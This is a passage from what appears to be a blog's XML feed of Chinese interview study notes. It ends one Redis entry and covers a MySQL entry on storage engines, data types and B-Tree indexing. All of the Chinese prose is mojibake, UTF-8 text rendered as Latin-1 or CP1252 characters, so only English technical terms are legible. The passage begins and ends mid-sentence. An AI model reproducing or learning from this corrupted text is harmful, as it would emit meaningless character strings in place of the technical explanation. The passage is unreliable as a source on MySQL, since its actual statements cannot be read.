è¿›è¡Œæ’åºä¸ºäº†æŒ‰å‘å¸ƒæ—¶é—´å’Œç‚¹èµæ•°è¿›è¡Œæ’åºï¼Œå¯ä»¥å»ºç«‹ä¸€ä¸ªæ–‡ç« å‘å¸ƒæ—¶é—´çš„æœ‰åºé›†åˆå’Œä¸€ä¸ªæ–‡ç« ç‚¹èµæ•°çš„æœ‰åºé›†åˆã€‚ï¼ˆä¸‹å›¾ä¸­çš„ score å°±æ˜¯è¿™é‡Œæ‰€è¯´çš„ç‚¹èµæ•°ï¼›ä¸‹é¢æ‰€ç¤ºçš„æœ‰åºé›†åˆåˆ†å€¼å¹¶ä¸ç›´æ¥æ˜¯æ—¶é—´å’Œç‚¹èµæ•°ï¼Œè€Œæ˜¯æ ¹æ®æ—¶é—´å’Œç‚¹èµæ•°é—´æ¥è®¡ç®—å‡ºæ¥çš„ï¼‰ å‚è€ƒèµ„æ–™ Carlson J L. Redis in Action[J]. Media.johnwiley.com.au, 2013. é»„å¥å®. Redis è®¾è®¡ä¸å®ç° [M]. æœºæ¢°å·¥ä¸šå‡ºç‰ˆç¤¾, 2014. REDIS IN ACTION Skip Lists: Done Right è®ºè¿° Redis å’Œ Memcached çš„å·®å¼‚ Redis 3.0 ä¸­æ–‡ç‰ˆ- åˆ†ç‰‡ Redis åº”ç”¨åœºæ™¯ Observer vs Pub-Sub]]></content>
      <categories>
        <category>Github</category>
        <category>Interview-Notebook</category>
      </categories>
      <tags>
        <tag>æŠ€æœ¯</tag>
        <tag>Java</tag>
        <tag>è½¬è½½</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MySQL]]></title>
    <url>%2F2018%2F07%2F04%2FJava%2FInterview%2FInterview-Notebook%2FMySQL%2F</url>
    <content type="text"><![CDATA[ä¸€ã€å­˜å‚¨å¼•æ“ InnoDB MyISAM æ¯”è¾ƒ äºŒã€æ•°æ®ç±»å‹ æ•´å‹ æµ®ç‚¹æ•° å­—ç¬¦ä¸² æ—¶é—´å’Œæ—¥æœŸ ä¸‰ã€ç´¢å¼• B Tree åŸç† ç´¢å¼•åˆ†ç±» ç´¢å¼•çš„ä¼˜ç‚¹ ç´¢å¼•ä¼˜åŒ– å››ã€æŸ¥è¯¢æ€§èƒ½ä¼˜åŒ– ä½¿ç”¨ Explain è¿›è¡Œåˆ†æ ä¼˜åŒ–æ•°æ®è®¿é—® é‡æ„æŸ¥è¯¢æ–¹å¼ äº”ã€åˆ‡åˆ† æ°´å¹³åˆ‡åˆ† å‚ç›´åˆ‡åˆ† Sharding ç­–ç•¥ Sharding å­˜åœ¨çš„é—®é¢˜åŠè§£å†³æ–¹æ¡ˆ å…­ã€å¤åˆ¶ ä¸»ä»å¤åˆ¶ è¯»å†™åˆ†ç¦» å‚è€ƒèµ„æ–™ ä¸€ã€å­˜å‚¨å¼•æ“InnoDBInnoDB æ˜¯ MySQL é»˜è®¤çš„äº‹åŠ¡å‹å­˜å‚¨å¼•æ“ï¼Œåªæœ‰åœ¨éœ€è¦ InnoDB ä¸æ”¯æŒçš„ç‰¹æ€§æ—¶ï¼Œæ‰è€ƒè™‘ä½¿ç”¨å…¶å®ƒå­˜å‚¨å¼•æ“ã€‚ å®ç°äº†å››ä¸ªæ ‡å‡†çš„éš”ç¦»çº§åˆ«ï¼Œé»˜è®¤çº§åˆ«æ˜¯å¯é‡å¤è¯»ï¼ˆREPEATABLE READï¼‰ã€‚åœ¨å¯é‡å¤è¯»éš”ç¦»çº§åˆ«ä¸‹ï¼Œé€šè¿‡å¤šç‰ˆæœ¬å¹¶å‘æ§åˆ¶ï¼ˆMVCCï¼‰+ é—´éš™é”ï¼ˆnext-key lockingï¼‰é˜²æ­¢å¹»å½±è¯»ã€‚ ä¸»ç´¢å¼•æ˜¯èšç°‡ç´¢å¼•ï¼Œåœ¨ç´¢å¼•ä¸­ä¿å­˜äº†æ•°æ®ï¼Œä»è€Œé¿å…ç›´æ¥è¯»å–ç£ç›˜ï¼Œå› æ­¤å¯¹æŸ¥è¯¢æ€§èƒ½æœ‰å¾ˆå¤§çš„æå‡ã€‚ å†…éƒ¨åšäº†å¾ˆå¤šä¼˜åŒ–ï¼ŒåŒ…æ‹¬ä»ç£ç›˜è¯»å–æ•°æ®æ—¶é‡‡ç”¨çš„å¯é¢„æµ‹æ€§è¯»ã€èƒ½å¤ŸåŠ å¿«è¯»æ“ä½œå¹¶ä¸”è‡ªåŠ¨åˆ›å»ºçš„è‡ªé€‚åº”å“ˆå¸Œç´¢å¼•ã€èƒ½å¤ŸåŠ é€Ÿæ’å…¥æ“ä½œçš„æ’å…¥ç¼“å†²åŒºç­‰ã€‚ æ”¯æŒçœŸæ­£çš„åœ¨çº¿çƒ­å¤‡ä»½ã€‚å…¶å®ƒå­˜å‚¨å¼•æ“ä¸æ”¯æŒåœ¨çº¿çƒ­å¤‡ä»½ï¼Œè¦è·å–ä¸€è‡´æ€§è§†å›¾éœ€è¦åœæ­¢å¯¹æ‰€æœ‰è¡¨çš„å†™å…¥ï¼Œè€Œåœ¨è¯»å†™æ··åˆåœºæ™¯ä¸­ï¼Œåœæ­¢å†™å…¥å¯èƒ½ä¹Ÿæ„å‘³ç€åœæ­¢è¯»å–ã€‚ MyISAMMyISAM è®¾è®¡ç®€å•ï¼Œæ•°æ®ä»¥ç´§å¯†æ ¼å¼å­˜å‚¨ã€‚å¯¹äºåªè¯»æ•°æ®ï¼Œæˆ–è€…è¡¨æ¯”è¾ƒå°ã€å¯ä»¥å®¹å¿ä¿®å¤æ“ä½œï¼Œåˆ™ä¾ç„¶å¯ä»¥ä½¿ç”¨ MyISAMã€‚ MyISAM æä¾›äº†å¤§é‡çš„ç‰¹æ€§ï¼ŒåŒ…æ‹¬å‹ç¼©è¡¨ã€ç©ºé—´æ•°æ®ç´¢å¼•ç­‰ã€‚ ä¸æ”¯æŒäº‹åŠ¡ã€‚ ä¸æ”¯æŒè¡Œçº§é”ï¼Œåªèƒ½å¯¹æ•´å¼ è¡¨åŠ é”ï¼Œè¯»å–æ—¶ä¼šå¯¹éœ€è¦è¯»åˆ°çš„æ‰€æœ‰è¡¨åŠ å…±äº«é”ï¼Œå†™å…¥æ—¶åˆ™å¯¹è¡¨åŠ æ’å®ƒé”ã€‚ä½†åœ¨è¡¨æœ‰è¯»å–æ“ä½œçš„åŒæ—¶ï¼Œä¹Ÿå¯ä»¥å¾€è¡¨ä¸­æ’å…¥æ–°çš„è®°å½•ï¼Œè¿™è¢«ç§°ä¸ºå¹¶å‘æ’å…¥ï¼ˆCONCURRENT INSERTï¼‰ã€‚ å¯ä»¥æ‰‹å·¥æˆ–è€…è‡ªåŠ¨æ‰§è¡Œæ£€æŸ¥å’Œä¿®å¤æ“ä½œï¼Œä½†æ˜¯å’Œäº‹åŠ¡æ¢å¤ä»¥åŠå´©æºƒæ¢å¤ä¸åŒï¼Œå¯èƒ½å¯¼è‡´ä¸€äº›æ•°æ®ä¸¢å¤±ï¼Œè€Œä¸”ä¿®å¤æ“ä½œæ˜¯éå¸¸æ…¢çš„ã€‚ å¦‚æœæŒ‡å®šäº† DELAY_KEY_WRITE é€‰é¡¹ï¼Œåœ¨æ¯æ¬¡ä¿®æ”¹æ‰§è¡Œå®Œæˆæ—¶ï¼Œä¸ä¼šç«‹å³å°†ä¿®æ”¹çš„ç´¢å¼•æ•°æ®å†™å…¥ç£ç›˜ï¼Œè€Œæ˜¯ä¼šå†™åˆ°å†…å­˜ä¸­çš„é”®ç¼“å†²åŒºï¼Œåªæœ‰åœ¨æ¸…ç†é”®ç¼“å†²åŒºæˆ–è€…å…³é—­è¡¨çš„æ—¶å€™æ‰ä¼šå°†å¯¹åº”çš„ç´¢å¼•å—å†™å…¥ç£ç›˜ã€‚è¿™ç§æ–¹å¼å¯ä»¥æå¤§çš„æå‡å†™å…¥æ€§èƒ½ï¼Œä½†æ˜¯åœ¨æ•°æ®åº“æˆ–è€…ä¸»æœºå´©æºƒæ—¶ä¼šé€ æˆç´¢å¼•æŸåï¼Œéœ€è¦æ‰§è¡Œä¿®å¤æ“ä½œã€‚ æ¯”è¾ƒ äº‹åŠ¡ï¼šInnoDB æ˜¯äº‹åŠ¡å‹çš„ï¼Œå¯ä»¥ä½¿ç”¨ Commit å’Œ Rollback è¯­å¥ã€‚ å¹¶å‘ï¼šMyISAM åªæ”¯æŒè¡¨çº§é”ï¼Œè€Œ InnoDB è¿˜æ”¯æŒè¡Œçº§é”ã€‚ å¤–é”®ï¼šInnoDB æ”¯æŒå¤–é”®ã€‚ å¤‡ä»½ï¼šInnoDB æ”¯æŒåœ¨çº¿çƒ­å¤‡ä»½ã€‚ å´©æºƒæ¢å¤ï¼šMyISAM å´©æºƒåå‘ç”ŸæŸåçš„æ¦‚ç‡æ¯” InnoDB é«˜å¾ˆå¤šï¼Œè€Œä¸”æ¢å¤çš„é€Ÿåº¦ä¹Ÿæ›´æ…¢ã€‚ å…¶å®ƒç‰¹æ€§ï¼šMyISAM æ”¯æŒå‹ç¼©è¡¨å’Œç©ºé—´æ•°æ®ç´¢å¼•ã€‚ äºŒã€æ•°æ®ç±»å‹æ•´å‹TINYINT, SMALLINT, MEDIUMINT, INT, BIGINT åˆ†åˆ«ä½¿ç”¨ 8, 16, 24, 32, 64 ä½å­˜å‚¨ç©ºé—´ï¼Œä¸€èˆ¬æƒ…å†µä¸‹è¶Šå°çš„åˆ—è¶Šå¥½ã€‚ INT(11) ä¸­çš„æ•°å­—åªæ˜¯è§„å®šäº†äº¤äº’å·¥å…·æ˜¾ç¤ºå­—ç¬¦çš„ä¸ªæ•°ï¼Œå¯¹äºå­˜å‚¨å’Œè®¡ç®—æ¥è¯´æ˜¯æ²¡æœ‰æ„ä¹‰çš„ã€‚ æµ®ç‚¹æ•°FLOAT å’Œ DOUBLE ä¸ºæµ®ç‚¹ç±»å‹ï¼ŒDECIMAL ä¸ºé«˜ç²¾åº¦å°æ•°ç±»å‹ã€‚CPU åŸç”Ÿæ”¯æŒæµ®ç‚¹è¿ç®—ï¼Œä½†æ˜¯ä¸æ”¯æŒ DECIMAl ç±»å‹çš„è®¡ç®—ï¼Œå› æ­¤ DECIMAL çš„è®¡ç®—æ¯”æµ®ç‚¹ç±»å‹éœ€è¦æ›´é«˜çš„ä»£ä»·ã€‚ FLOATã€DOUBLE å’Œ DECIMAL éƒ½å¯ä»¥æŒ‡å®šåˆ—å®½ï¼Œä¾‹å¦‚ DECIMAL(18, 9) è¡¨ç¤ºæ€»å…± 18 ä½ï¼Œå– 9 ä½å­˜å‚¨å°æ•°éƒ¨åˆ†ï¼Œå‰©ä¸‹ 9 ä½å­˜å‚¨æ•´æ•°éƒ¨åˆ†ã€‚ å­—ç¬¦ä¸²ä¸»è¦æœ‰ CHAR å’Œ VARCHAR ä¸¤ç§ç±»å‹ï¼Œä¸€ç§æ˜¯å®šé•¿çš„ï¼Œä¸€ç§æ˜¯å˜é•¿çš„ã€‚ VARCHAR è¿™ç§å˜é•¿ç±»å‹èƒ½å¤ŸèŠ‚çœç©ºé—´ï¼Œå› ä¸ºåªéœ€è¦å­˜å‚¨å¿…è¦çš„å†…å®¹ã€‚ä½†æ˜¯åœ¨æ‰§è¡Œ UPDATE æ—¶å¯èƒ½ä¼šä½¿è¡Œå˜å¾—æ¯”åŸæ¥é•¿ï¼Œå½“è¶…å‡ºä¸€ä¸ªé¡µæ‰€èƒ½å®¹çº³çš„å¤§å°æ—¶ï¼Œå°±è¦æ‰§è¡Œé¢å¤–çš„æ“ä½œã€‚MyISAM ä¼šå°†è¡Œæ‹†æˆä¸åŒçš„ç‰‡æ®µå­˜å‚¨ï¼Œè€Œ InnoDB åˆ™éœ€è¦åˆ†è£‚é¡µæ¥ä½¿è¡Œæ”¾è¿›é¡µå†…ã€‚ VARCHAR ä¼šä¿ç•™å­—ç¬¦ä¸²æœ«å°¾çš„ç©ºæ ¼ï¼Œè€Œ CHAR ä¼šåˆ é™¤ã€‚ æ—¶é—´å’Œæ—¥æœŸMySQL æä¾›äº†ä¸¤ç§ç›¸ä¼¼çš„æ—¥æœŸæ—¶é—´ç±»å‹ï¼šDATATIME å’Œ TIMESTAMPã€‚ 1. DATATIMEèƒ½å¤Ÿä¿å­˜ä» 1001 å¹´åˆ° 9999 å¹´çš„æ—¥æœŸå’Œæ—¶é—´ï¼Œç²¾åº¦ä¸ºç§’ï¼Œä½¿ç”¨ 8 å­—èŠ‚çš„å­˜å‚¨ç©ºé—´ã€‚ å®ƒä¸æ—¶åŒºæ— å…³ã€‚ é»˜è®¤æƒ…å†µä¸‹ï¼ŒMySQL ä»¥ä¸€ç§å¯æ’åºçš„ã€æ— æ­§ä¹‰çš„æ ¼å¼æ˜¾ç¤º DATATIME å€¼ï¼Œä¾‹å¦‚â€œ2008-01-16 22:37:08â€ï¼Œè¿™æ˜¯ ANSI æ ‡å‡†å®šä¹‰çš„æ—¥æœŸå’Œæ—¶é—´è¡¨ç¤ºæ–¹æ³•ã€‚ 2. TIMESTAMPå’Œ UNIX æ—¶é—´æˆ³ç›¸åŒï¼Œä¿å­˜ä» 1970 å¹´ 1 æœˆ 1 æ—¥åˆå¤œï¼ˆæ ¼æ—å¨æ²»æ—¶é—´ï¼‰ä»¥æ¥çš„ç§’æ•°ï¼Œä½¿ç”¨ 4 ä¸ªå­—èŠ‚ï¼Œåªèƒ½è¡¨ç¤ºä» 1970 å¹´ åˆ° 2038 å¹´ã€‚ å®ƒå’Œæ—¶åŒºæœ‰å…³ï¼Œä¹Ÿå°±æ˜¯è¯´ä¸€ä¸ªæ—¶é—´æˆ³åœ¨ä¸åŒçš„æ—¶åŒºæ‰€ä»£è¡¨çš„å…·ä½“æ—¶é—´æ˜¯ä¸åŒçš„ã€‚ MySQL æä¾›äº† FROM_UNIXTIME() å‡½æ•°æŠŠ UNIX æ—¶é—´æˆ³è½¬æ¢ä¸ºæ—¥æœŸï¼Œå¹¶æä¾›äº† UNIX_TIMESTAMP() å‡½æ•°æŠŠæ—¥æœŸè½¬æ¢ä¸º UNIX æ—¶é—´æˆ³ã€‚ é»˜è®¤æƒ…å†µä¸‹ï¼Œå¦‚æœæ’å…¥æ—¶æ²¡æœ‰æŒ‡å®š TIMESTAMP åˆ—çš„å€¼ï¼Œä¼šå°†è¿™ä¸ªå€¼è®¾ç½®ä¸ºå½“å‰æ—¶é—´ã€‚ åº”è¯¥å°½é‡ä½¿ç”¨ TIMESTAMPï¼Œå› ä¸ºå®ƒæ¯” DATETIME ç©ºé—´æ•ˆç‡æ›´é«˜ã€‚ ä¸‰ã€ç´¢å¼•ç´¢å¼•èƒ½å¤Ÿè½»æ˜“å°†æŸ¥è¯¢æ€§èƒ½æå‡å‡ ä¸ªæ•°é‡çº§ã€‚ å¯¹äºéå¸¸å°çš„è¡¨ã€å¤§éƒ¨åˆ†æƒ…å†µä¸‹ç®€å•çš„å…¨è¡¨æ‰«ææ¯”å»ºç«‹ç´¢å¼•æ›´é«˜æ•ˆã€‚å¯¹äºä¸­åˆ°å¤§å‹çš„è¡¨ï¼Œç´¢å¼•å°±éå¸¸æœ‰æ•ˆã€‚ä½†æ˜¯å¯¹äºç‰¹å¤§å‹çš„è¡¨ï¼Œå»ºç«‹å’Œç»´æŠ¤ç´¢å¼•çš„ä»£ä»·å°†ä¼šéšä¹‹å¢é•¿ã€‚è¿™ç§æƒ…å†µä¸‹ï¼Œéœ€è¦ç”¨åˆ°ä¸€ç§æŠ€æœ¯å¯ä»¥ç›´æ¥åŒºåˆ†å‡ºéœ€è¦æŸ¥è¯¢çš„ä¸€ç»„æ•°æ®ï¼Œè€Œä¸æ˜¯ä¸€æ¡è®°å½•ä¸€æ¡è®°å½•åœ°åŒ¹é…ï¼Œä¾‹å¦‚å¯ä»¥ä½¿ç”¨åˆ†åŒºæŠ€æœ¯ã€‚ ç´¢å¼•æ˜¯åœ¨å­˜å‚¨å¼•æ“å±‚å®ç°çš„ï¼Œè€Œä¸æ˜¯åœ¨æœåŠ¡å™¨å±‚å®ç°çš„ï¼Œæ‰€ä»¥ä¸åŒå­˜å‚¨å¼•æ“å…·æœ‰ä¸åŒçš„ç´¢å¼•ç±»å‹å’Œå®ç°ã€‚ B Tree åŸç†1. B-Tree å®šä¹‰ä¸€æ¡æ•°æ®è®°å½•ä¸ºä¸€ä¸ªäºŒå…ƒç»„ [key, data]ï¼ŒB-Tree æ˜¯æ»¡è¶³ä¸‹åˆ—æ¡ä»¶çš„æ•°æ®ç»“æ„ï¼š æ‰€æœ‰å¶èŠ‚ç‚¹å…·æœ‰ç›¸åŒçš„æ·±åº¦ï¼Œä¹Ÿå°±æ˜¯è¯´ B-Tree æ˜¯å¹³è¡¡çš„ï¼› ä¸€ä¸ªèŠ‚ç‚¹ä¸­çš„ key ä»å·¦åˆ°å³éé€’å‡æ’åˆ—ï¼› å¦‚æœæŸä¸ªæŒ‡é’ˆçš„å·¦å³ç›¸é‚» key åˆ†åˆ«æ˜¯ keyi å’Œ keyi+1ï¼Œä¸”ä¸ä¸º nullï¼Œåˆ™è¯¥æŒ‡é’ˆæŒ‡å‘èŠ‚ç‚¹çš„æ‰€æœ‰ key å¤§äºç­‰äº keyi ä¸”å°äºç­‰äº keyi+1ã€‚ æŸ¥æ‰¾ç®—æ³•ï¼šé¦–å…ˆåœ¨æ ¹èŠ‚ç‚¹è¿›è¡ŒäºŒåˆ†æŸ¥æ‰¾ï¼Œå¦‚æœæ‰¾åˆ°åˆ™è¿”å›å¯¹åº”èŠ‚ç‚¹çš„ dataï¼Œå¦åˆ™åœ¨ç›¸åº”åŒºé—´çš„æŒ‡é’ˆæŒ‡å‘çš„èŠ‚ç‚¹é€’å½’è¿›è¡ŒæŸ¥æ‰¾ã€‚ ç”±äºæ’å…¥åˆ é™¤æ–°çš„æ•°æ®è®°å½•ä¼šç ´å B-Tree çš„æ€§è´¨ï¼Œå› æ­¤åœ¨æ’å…¥åˆ é™¤æ—¶ï¼Œéœ€è¦å¯¹æ ‘è¿›è¡Œä¸€ä¸ªåˆ†è£‚ã€åˆå¹¶ã€æ—‹è½¬ç­‰æ“ä½œä»¥ä¿æŒ B-Tree æ€§è´¨ã€‚ 2. B+Tree ä¸ B-Tree ç›¸æ¯”ï¼ŒB+Tree æœ‰ä»¥ä¸‹ä¸åŒç‚¹ï¼š æ¯ä¸ªèŠ‚ç‚¹çš„æŒ‡é’ˆä¸Šé™ä¸º 2d è€Œä¸æ˜¯ 2d+1ï¼ˆd ä¸ºèŠ‚ç‚¹çš„å‡ºåº¦ï¼‰ï¼› å†…èŠ‚ç‚¹ä¸å­˜å‚¨ dataï¼Œåªå­˜å‚¨ keyï¼› å¶å­èŠ‚ç‚¹ä¸å­˜å‚¨æŒ‡é’ˆã€‚ 3. é¡ºåºè®¿é—®æŒ‡é’ˆ ä¸€èˆ¬åœ¨æ•°æ®åº“ç³»ç»Ÿæˆ–æ–‡ä»¶ç³»ç»Ÿä¸­ä½¿ç”¨çš„ B+Tree ç»“æ„éƒ½åœ¨ç»å…¸ B+Tree åŸºç¡€ä¸Šè¿›è¡Œäº†ä¼˜åŒ–ï¼Œåœ¨å¶å­èŠ‚ç‚¹å¢åŠ äº†é¡ºåºè®¿é—®æŒ‡é’ˆï¼Œåšè¿™ä¸ªä¼˜åŒ–çš„ç›®çš„æ˜¯ä¸ºäº†æé«˜åŒºé—´è®¿é—®çš„æ€§èƒ½ã€‚ 4. ä¼˜åŠ¿çº¢é»‘æ ‘ç­‰å¹³è¡¡æ ‘ä¹Ÿå¯ä»¥ç”¨æ¥å®ç°ç´¢å¼•ï¼Œä½†æ˜¯æ–‡ä»¶ç³»ç»ŸåŠæ•°æ®åº“ç³»ç»Ÿæ™®éé‡‡ç”¨ B Tree ä½œä¸ºç´¢å¼•ç»“æ„ï¼Œä¸»è¦æœ‰ä»¥ä¸‹ä¸¤ä¸ªåŸå› ï¼š ï¼ˆä¸€ï¼‰æ›´å°‘çš„æ£€ç´¢æ¬¡æ•° å¹³è¡¡æ ‘æ£€ç´¢æ•°æ®çš„æ—¶é—´å¤æ‚åº¦ç­‰äºæ ‘é«˜ hï¼Œè€Œæ ‘é«˜å¤§è‡´ä¸º O(h)=O(logdN)ï¼Œå…¶ä¸­ d ä¸ºæ¯ä¸ªèŠ‚ç‚¹çš„å‡ºåº¦ã€‚ çº¢é»‘æ ‘çš„å‡ºåº¦ä¸º 2ï¼Œè€Œ B Tree çš„å‡ºåº¦ä¸€èˆ¬éƒ½éå¸¸å¤§ã€‚çº¢é»‘æ ‘çš„æ ‘é«˜ h å¾ˆæ˜æ˜¾æ¯” B Tree å¤§éå¸¸å¤šï¼Œå› æ­¤æ£€ç´¢çš„æ¬¡æ•°ä¹Ÿå°±æ›´å¤šã€‚ B+Tree ç›¸æ¯”äº B-Tree æ›´é€‚åˆå¤–å­˜ç´¢å¼•ï¼Œå› ä¸º B+Tree å†…èŠ‚ç‚¹å»æ‰äº† data åŸŸï¼Œå› æ­¤å¯ä»¥æ‹¥æœ‰æ›´å¤§çš„å‡ºåº¦ï¼Œæ£€ç´¢æ•ˆç‡ä¼šæ›´é«˜ã€‚ ï¼ˆäºŒï¼‰åˆ©ç”¨è®¡ç®—æœºé¢„è¯»ç‰¹æ€§ ä¸ºäº†å‡å°‘ç£ç›˜ I/Oï¼Œç£ç›˜å¾€å¾€ä¸æ˜¯ä¸¥æ ¼æŒ‰éœ€è¯»å–ï¼Œè€Œæ˜¯æ¯æ¬¡éƒ½ä¼šé¢„è¯»ã€‚è¿™æ ·åšçš„ç†è®ºä¾æ®æ˜¯è®¡ç®—æœºç§‘å­¦ä¸­è‘—åçš„å±€éƒ¨æ€§åŸç†ï¼šå½“ä¸€ä¸ªæ•°æ®è¢«ç”¨åˆ°æ—¶ï¼Œå…¶é™„è¿‘çš„æ•°æ®ä¹Ÿé€šå¸¸ä¼šé©¬ä¸Šè¢«ä½¿ç”¨ã€‚é¢„è¯»è¿‡ç¨‹ä¸­ï¼Œç£ç›˜è¿›è¡Œé¡ºåºè¯»å–ï¼Œé¡ºåºè¯»å–ä¸éœ€è¦è¿›è¡Œç£ç›˜å¯»é“ï¼Œå¹¶ä¸”åªéœ€è¦å¾ˆçŸ­çš„æ—‹è½¬æ—¶é—´ï¼Œå› æ­¤é€Ÿåº¦ä¼šéå¸¸å¿«ã€‚ æ“ä½œç³»ç»Ÿä¸€èˆ¬å°†å†…å­˜å’Œç£ç›˜åˆ†å‰²æˆå›ºæ€å¤§å°çš„å—ï¼Œæ¯ä¸€å—ç§°ä¸ºä¸€é¡µï¼Œå†…å­˜ä¸ç£ç›˜ä»¥é¡µä¸ºå•ä½äº¤æ¢æ•°æ®ã€‚æ•°æ®åº“ç³»ç»Ÿå°†ç´¢å¼•çš„ä¸€ä¸ªèŠ‚ç‚¹çš„å¤§å°è®¾ç½®ä¸ºé¡µçš„å¤§å°ï¼Œä½¿å¾—ä¸€æ¬¡ I/O å°±èƒ½å®Œå…¨è½½å…¥ä¸€ä¸ªèŠ‚ç‚¹ï¼Œå¹¶ä¸”å¯ä»¥åˆ©ç”¨é¢„è¯»ç‰¹æ€§ï¼Œç›¸é‚»çš„èŠ‚ç‚¹ä¹Ÿèƒ½å¤Ÿè¢«é¢„å…ˆè½½å…¥ã€‚ æ›´å¤šå†…å®¹è¯·å‚è€ƒï¼šMySQL ç´¢å¼•èƒŒåçš„æ•°æ®ç»“æ„åŠç®—æ³•åŸç† ç´¢å¼•åˆ†ç±»1. B+Tree ç´¢å¼•B+Tree ç´¢å¼•æ˜¯å¤§å¤šæ•° MySQL å­˜å‚¨å¼•æ“çš„é»˜è®¤ç´¢å¼•ç±»å‹ã€‚ å› ä¸ºä¸å†éœ€è¦è¿›è¡Œå…¨è¡¨æ‰«æï¼Œåªéœ€è¦å¯¹æ ‘è¿›è¡Œæœç´¢å³å¯ï¼Œå› æ­¤æŸ¥æ‰¾é€Ÿåº¦å¿«å¾ˆå¤šã€‚é™¤äº†ç”¨äºæŸ¥æ‰¾ï¼Œè¿˜å¯ä»¥ç”¨äºæ’åºå’Œåˆ†ç»„ã€‚ å¯ä»¥æŒ‡å®šå¤šä¸ªåˆ—ä½œä¸ºç´¢å¼•åˆ—ï¼Œå¤šä¸ªç´¢å¼•åˆ—å…±åŒç»„æˆé”®ã€‚ B+Tree ç´¢å¼•é€‚ç”¨äºå…¨é”®å€¼ã€é”®å€¼èŒƒå›´å’Œé”®å‰ç¼€æŸ¥æ‰¾ï¼Œå…¶ä¸­é”®å‰ç¼€æŸ¥æ‰¾åªé€‚ç”¨äºæœ€å·¦å‰ç¼€æŸ¥æ‰¾ã€‚ å¦‚æœä¸æ˜¯æŒ‰ç…§ç´¢å¼•åˆ—çš„é¡ºåºè¿›è¡ŒæŸ¥æ‰¾ï¼Œåˆ™æ— æ³•ä½¿ç”¨ç´¢å¼•ã€‚ InnoDB çš„ B+Tree ç´¢å¼•åˆ†ä¸ºä¸»ç´¢å¼•å’Œè¾…åŠ©ç´¢å¼•ã€‚ ä¸»ç´¢å¼•çš„å¶å­èŠ‚ç‚¹ data åŸŸè®°å½•ç€å®Œæ•´çš„æ•°æ®è®°å½•ï¼Œè¿™ç§ç´¢å¼•æ–¹å¼è¢«ç§°ä¸ºèšç°‡ç´¢å¼•ã€‚å› ä¸ºæ— æ³•æŠŠæ•°æ®è¡Œå­˜æ”¾åœ¨ä¸¤ä¸ªä¸åŒçš„åœ°æ–¹ï¼Œæ‰€ä»¥ä¸€ä¸ªè¡¨åªèƒ½æœ‰ä¸€ä¸ªèšç°‡ç´¢å¼•ã€‚ è¾…åŠ©ç´¢å¼•çš„å¶å­èŠ‚ç‚¹çš„ data åŸŸè®°å½•ç€ä¸»é”®çš„å€¼ï¼Œå› æ­¤åœ¨ä½¿ç”¨è¾…åŠ©ç´¢å¼•è¿›è¡ŒæŸ¥æ‰¾æ—¶ï¼Œéœ€è¦å…ˆæŸ¥æ‰¾åˆ°ä¸»é”®å€¼ï¼Œç„¶åå†åˆ°ä¸»ç´¢å¼•ä¸­è¿›è¡ŒæŸ¥æ‰¾ã€‚ 2. å“ˆå¸Œç´¢å¼•InnoDB å¼•æ“æœ‰ä¸€ä¸ªç‰¹æ®Šçš„åŠŸèƒ½å«â€œè‡ªé€‚åº”å“ˆå¸Œç´¢å¼•â€ï¼Œå½“æŸä¸ªç´¢å¼•å€¼è¢«ä½¿ç”¨çš„éå¸¸é¢‘ç¹æ—¶ï¼Œä¼šåœ¨ B+Tree ç´¢å¼•ä¹‹ä¸Šå†åˆ›å»ºä¸€ä¸ªå“ˆå¸Œç´¢å¼•ï¼Œè¿™æ ·å°±è®© B+Tree ç´¢å¼•å…·æœ‰å“ˆå¸Œç´¢å¼•çš„ä¸€äº›ä¼˜ç‚¹ï¼Œæ¯”å¦‚å¿«é€Ÿçš„å“ˆå¸ŒæŸ¥æ‰¾ã€‚ å“ˆå¸Œç´¢å¼•èƒ½ä»¥ O(1) æ—¶é—´è¿›è¡ŒæŸ¥æ‰¾ï¼Œä½†æ˜¯å¤±å»äº†æœ‰åºæ€§ï¼Œå®ƒå…·æœ‰ä»¥ä¸‹é™åˆ¶ï¼š æ— æ³•ç”¨äºæ’åºä¸åˆ†ç»„ï¼› åªæ”¯æŒç²¾ç¡®æŸ¥æ‰¾ï¼Œæ— æ³•ç”¨äºéƒ¨åˆ†æŸ¥æ‰¾å’ŒèŒƒå›´æŸ¥æ‰¾ï¼› 3. å…¨æ–‡ç´¢å¼•MyISAM å­˜å‚¨å¼•æ“æ”¯æŒå…¨æ–‡ç´¢å¼•ï¼Œç”¨äºæŸ¥æ‰¾æ–‡æœ¬ä¸­çš„å…³é”®è¯ï¼Œè€Œä¸æ˜¯ç›´æ¥æ¯”è¾ƒæ˜¯å¦ç›¸ç­‰ã€‚æŸ¥æ‰¾æ¡ä»¶ä½¿ç”¨ MATCH AGAINSTï¼Œè€Œä¸æ˜¯æ™®é€šçš„ WHEREã€‚ å…¨æ–‡ç´¢å¼•ä¸€èˆ¬ä½¿ç”¨å€’æ’ç´¢å¼•å®ç°ï¼Œå®ƒè®°å½•ç€å…³é”®è¯åˆ°å…¶æ‰€åœ¨æ–‡æ¡£çš„æ˜ å°„ã€‚ InnoDB å­˜å‚¨å¼•æ“åœ¨ MySQL 5.6.4 ç‰ˆæœ¬ä¸­ä¹Ÿå¼€å§‹æ”¯æŒå…¨æ–‡ç´¢å¼•ã€‚ 4. ç©ºé—´æ•°æ®ç´¢å¼•ï¼ˆR-Treeï¼‰MyISAM å­˜å‚¨å¼•æ“æ”¯æŒç©ºé—´æ•°æ®ç´¢å¼•ï¼Œå¯ä»¥ç”¨äºåœ°ç†æ•°æ®å­˜å‚¨ã€‚ç©ºé—´æ•°æ®ç´¢å¼•ä¼šä»æ‰€æœ‰ç»´åº¦æ¥ç´¢å¼•æ•°æ®ï¼Œå¯ä»¥æœ‰æ•ˆåœ°ä½¿ç”¨ä»»æ„ç»´åº¦æ¥è¿›è¡Œç»„åˆæŸ¥è¯¢ã€‚ å¿…é¡»ä½¿ç”¨ GIS ç›¸å…³çš„å‡½æ•°æ¥ç»´æŠ¤æ•°æ®ã€‚ ç´¢å¼•çš„ä¼˜ç‚¹ å¤§å¤§å‡å°‘äº†æœåŠ¡å™¨éœ€è¦æ‰«æçš„æ•°æ®è¡Œæ•°ã€‚ å¸®åŠ©æœåŠ¡å™¨é¿å…è¿›è¡Œæ’åºå’Œåˆ›å»ºä¸´æ—¶è¡¨ï¼ˆB+Tree ç´¢å¼•æ˜¯æœ‰åºçš„ï¼Œå¯ä»¥ç”¨æ¥åš ORDER BY å’Œ GROUP BY æ“ä½œï¼‰ï¼› å°†éšæœº I/O å˜ä¸ºé¡ºåº 